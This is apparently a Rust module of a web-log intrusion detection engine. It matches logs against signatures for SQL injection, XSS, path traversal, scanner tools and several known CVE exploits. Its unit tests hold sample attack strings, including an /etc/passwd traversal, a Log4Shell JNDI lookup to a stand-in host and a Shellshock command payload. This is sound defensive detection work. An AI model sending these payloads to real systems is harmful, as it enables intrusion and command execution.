use crate::models::{EventCategory, SecurityEvent, Severity, UnifiedLogEntry};
use aho_corasick::AhoCorasick;
use regex::Regex;
use serde::Deserialize;
use std::fs;
use std::path::Path;

#[derive(Debug, Clone)]
pub struct DetectionRule {
    pub id: String,
    pub title: String,
    pub category: EventCategory,
    pub severity: Severity,
    pub regex: Regex,
}

#[derive(Debug, Deserialize)]
struct CustomRulesFile {
    #[serde(default)]
    rule: Vec<CustomRuleDef>,
}

#[derive(Debug, Deserialize)]
struct CustomRuleDef {
    id: String,
    title: String,
    category: EventCategory,
    severity: Severity,
    pattern: String,
}

/// Fast two-stage rule matcher: Aho-Corasick pre-filter + targeted Regex verification.
pub struct RuleEngine {
    fast_matcher: AhoCorasick,
    fast_rules: Vec<(&'static str, &'static str, EventCategory, Severity)>,
    regex_rules: Vec<DetectionRule>,
}

impl RuleEngine {
    pub fn new(custom_rules_path: Option<&Path>) -> Self {
        let fast_defs: Vec<(&'static str, &'static str, &'static str, EventCategory, Severity)> = vec![
            // Reconnaissance
            ("AEGIS-RECON-ENV", "Sensitive .env Probe", "/.env", EventCategory::Reconnaissance, Severity::High),
            ("AEGIS-RECON-GIT", "Git Config Exposure Probe", "/.git/config", EventCategory::Reconnaissance, Severity::High),
            ("AEGIS-RECON-WP", "WordPress Login Probe", "/wp-login.php", EventCategory::Reconnaissance, Severity::Low),
            ("AEGIS-RECON-PMA", "phpMyAdmin Probe", "phpmyadmin", EventCategory::Reconnaissance, Severity::Medium),
            ("AEGIS-RECON-XMLRPC", "WordPress XML-RPC Probe", "/xmlrpc.php", EventCategory::Reconnaissance, Severity::Medium),
            // Path Traversal & LFI/RFI
            ("AEGIS-LFI-TRAV", "Path Traversal Attempt", "../", EventCategory::WebAttack, Severity::High),
            ("AEGIS-LFI-ENC", "Encoded Path Traversal Attempt", "%2e%2e%2f", EventCategory::WebAttack, Severity::High),
            ("AEGIS-LFI-PASSWD", "LFI /etc/passwd Probe", "/etc/passwd", EventCategory::WebAttack, Severity::Critical),
            ("AEGIS-LFI-PHPWRAP", "PHP Stream Wrapper Injection", "php://", EventCategory::WebAttack, Severity::Critical),
            // SQLi quick indicators
            ("AEGIS-SQLI-UNION", "SQL Injection (UNION SELECT)", "union select", EventCategory::WebAttack, Severity::High),
            ("AEGIS-SQLI-SLEEP", "Time-Based SQLi (SLEEP)", "sleep(", EventCategory::WebAttack, Severity::High),
            ("AEGIS-SQLI-BENCH", "Time-Based SQLi (BENCHMARK)", "benchmark(", EventCategory::WebAttack, Severity::High),
            // XSS quick indicators
            ("AEGIS-XSS-SCRIPT", "XSS Script Tag Injection", "<script", EventCategory::WebAttack, Severity::High),
            ("AEGIS-XSS-ONERR", "XSS Event Handler Injection", "onerror=", EventCategory::WebAttack, Severity::High),
            ("AEGIS-XSS-JS", "XSS JavaScript URI", "javascript:", EventCategory::WebAttack, Severity::Medium),
            // Known CVE RCE Exploitation Signatures
            ("AEGIS-CVE-2021-41773", "Apache Path Traversal / RCE (CVE-2021-41773)", ".%2e/", EventCategory::WebAttack, Severity::Critical),
            ("AEGIS-CVE-2021-42013", "Apache Double-Encoded Traversal RCE (CVE-2021-42013)", "%%32%65", EventCategory::WebAttack, Severity::Critical),
            ("AEGIS-CVE-2024-4577", "PHP-CGI Argument Injection RCE (CVE-2024-4577)", "allow_url_include", EventCategory::WebAttack, Severity::Critical),
            ("AEGIS-CVE-2024-4577-APF", "PHP-CGI Auto-Prepend RCE (CVE-2024-4577)", "auto_prepend_file", EventCategory::WebAttack, Severity::Critical),
            ("AEGIS-CVE-2021-44228", "Log4Shell JNDI RCE Attempt (CVE-2021-44228)", "${jndi:", EventCategory::WebAttack, Severity::Critical),
            ("AEGIS-CVE-2017-9841", "PHPUnit eval-stdin RCE Probe (CVE-2017-9841)", "eval-stdin.php", EventCategory::WebAttack, Severity::Critical),
            ("AEGIS-CVE-2021-3129", "Laravel Ignition RCE Probe (CVE-2021-3129)", "_ignition/execute-solution", EventCategory::WebAttack, Severity::Critical),
            ("AEGIS-CVE-THINKPHP", "ThinkPHP InvokeFunction RCE Probe", "invokefunction", EventCategory::WebAttack, Severity::Critical),
        ];

        let patterns: Vec<&str> = fast_defs.iter().map(|d| d.2).collect();
        let fast_matcher = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(&patterns)
            .expect("AhoCorasick rules must compile");

        let fast_rules = fast_defs
            .into_iter()
            .map(|(id, title, _, cat, sev)| (id, title, cat, sev))
            .collect();

        let mut regex_rules = vec![
            DetectionRule {
                id: "AEGIS-SQLI-TAUTOLOGY".into(),
                title: "SQL Injection (Boolean Tautology)".into(),
                category: EventCategory::WebAttack,
                severity: Severity::High,
                regex: Regex::new(r#"(?i)(?:'|%27)\s*(?:or|and)\s*(?:\d+=\d+|'[^']*'='[^']*'|true)"#).unwrap(),
            },
            DetectionRule {
                id: "AEGIS-RFI-HTTP".into(),
                title: "Remote File Inclusion (RFI)".into(),
                category: EventCategory::WebAttack,
                severity: Severity::Critical,
                regex: Regex::new(r#"(?i)[?&](?:file|page|include|url|path)=https?://"#).unwrap(),
            },
            DetectionRule {
                id: "AEGIS-SCANNER-UA".into(),
                title: "Automated Vulnerability Scanner Detected".into(),
                category: EventCategory::Reconnaissance,
                severity: Severity::Medium,
                regex: Regex::new(r#"(?i)(?:sqlmap|nikto|nuclei|gobuster|dirbuster|wpscan|acunetix|nessus)"#).unwrap(),
            },
            DetectionRule {
                id: "AEGIS-CVE-2014-6271".into(),
                title: "Shellshock Bash RCE Attempt (CVE-2014-6271)".into(),
                category: EventCategory::WebAttack,
                severity: Severity::Critical,
                regex: Regex::new(r#"\(\)\s*\{\s*:\s*;\s*\}"#).unwrap(),
            },
        ];

        if let Some(path) = custom_rules_path {
            if let Ok(raw) = fs::read_to_string(path) {
                if let Ok(parsed) = toml::from_str::<CustomRulesFile>(&raw) {
                    for def in parsed.rule {
                        if let Ok(re) = Regex::new(&def.pattern) {
                            regex_rules.push(DetectionRule {
                                id: def.id,
                                title: def.title,
                                category: def.category,
                                severity: def.severity,
                                regex: re,
                            });
                        }
                    }
                }
            }
        }

        Self {
            fast_matcher,
            fast_rules,
            regex_rules,
        }
    }

    /// Evaluates a normalized log entry against all fast and regex rules.
    pub fn evaluate(&self, entry: &UnifiedLogEntry) -> Vec<SecurityEvent> {
        let mut events = Vec::new();
        let decoded_path = normalize_url_for_scan(&entry.path);
        let target = format!("{decoded_path} {}", entry.user_agent);

        if let Some(m) = self.fast_matcher.find(&decoded_path) {
            let (id, title, ref cat, sev) = self.fast_rules[m.pattern().as_usize()];
            events.push(
                SecurityEvent::new(
                    sev,
                    cat.clone(),
                    title,
                    format!(
                        "[{}] {} {} -> HTTP {} from {}",
                        entry.server, entry.method, entry.path, entry.status, entry.client_ip
                    ),
                )
                .with_source_ip(entry.client_ip.clone())
                .with_rule_id(id)
                .with_raw_snippet(entry.raw_line.clone()),
            );
        }

        for rule in &self.regex_rules {
            if rule.regex.is_match(&target) {
                events.push(
                    SecurityEvent::new(
                        rule.severity,
                        rule.category.clone(),
                        rule.title.clone(),
                        format!(
                            "[{}] {} {} -> HTTP {} from {}",
                            entry.server, entry.method, entry.path, entry.status, entry.client_ip
                        ),
                    )
                    .with_source_ip(entry.client_ip.clone())
                    .with_rule_id(rule.id.clone())
                    .with_raw_snippet(entry.raw_line.clone()),
                );
            }
        }

        events
    }
}

/// Lightweight two-pass URL & SQL comment normalization for evasion resistance.
fn normalize_url_for_scan(input: &str) -> String {
    fn decode_once(s: &str) -> String {
        s.replace("%25", "%")
            .replace("%20", " ")
            .replace('+', " ")
            .replace("%27", "'")
            .replace("%3c", "<")
            .replace("%3C", "<")
            .replace("%3e", ">")
            .replace("%3E", ">")
            .replace("%2f", "/")
            .replace("%2F", "/")
            .replace("%2e", ".")
            .replace("%2E", ".")
    }
    let pass1 = decode_once(input);
    let pass2 = decode_once(&pass1);
    pass2.replace("/**/", " ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;

    fn sample_entry(path: &str, ua: &str) -> UnifiedLogEntry {
        UnifiedLogEntry {
            timestamp: Utc::now(),
            server: "nginx".into(),
            client_ip: "203.0.113.5".into(),
            method: "GET".into(),
            path: path.into(),
            status: 200,
            user_agent: ua.into(),
            bytes_sent: 100,
            raw_line: format!("GET {path}"),
            is_auth_failure: false,
        }
    }

    #[test]
    fn test_sqli_xss_lfi_recon_rules() {
        let engine = RuleEngine::new(None);
        assert!(!engine.evaluate(&sample_entry("/index.php?id=1%20UNION%20SELECT%201,2", "curl")).is_empty());
        assert!(!engine.evaluate(&sample_entry("/search?q=<script>alert(1)</script>", "Mozilla")).is_empty());
        assert!(!engine.evaluate(&sample_entry("/download?f=../../../../etc/passwd", "curl")).is_empty());
        assert!(!engine.evaluate(&sample_entry("/.env", "python-requests")).is_empty());
        assert!(!engine.evaluate(&sample_entry("/", "sqlmap/1.7")).is_empty());
        assert!(engine.evaluate(&sample_entry("/api/v1/health", "Mozilla/5.0")).is_empty());
    }

    #[test]
    fn test_evasion_double_encoding_and_sql_comments() {
        let engine = RuleEngine::new(None);
        assert!(!engine
            .evaluate(&sample_entry(
                "/download?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "curl"
            ))
            .is_empty());
        assert!(!engine
            .evaluate(&sample_entry(
                "/index.php?id=1%20UNION/**/SELECT%201,2",
                "curl"
            ))
            .is_empty());
    }

    #[test]
    fn test_cve_rce_signatures() {
        let engine = RuleEngine::new(None);
        assert!(!engine
            .evaluate(&sample_entry("/cgi-bin/.%2e/%2e%2e/bin/sh", "curl"))
            .is_empty());
        assert!(!engine
            .evaluate(&sample_entry("/index.php?%ADd+allow_url_include%3d1", "curl"))
            .is_empty());
        assert!(!engine
            .evaluate(&sample_entry("/?q=${jndi:ldap://evil.test/a}", "curl"))
            .is_empty());
        assert!(!engine
            .evaluate(&sample_entry("/_ignition/execute-solution", "curl"))
            .is_empty());
        assert!(!engine
            .evaluate(&sample_entry("/", "() { :; }; /bin/bash -c id"))
            .is_empty());
    }
}
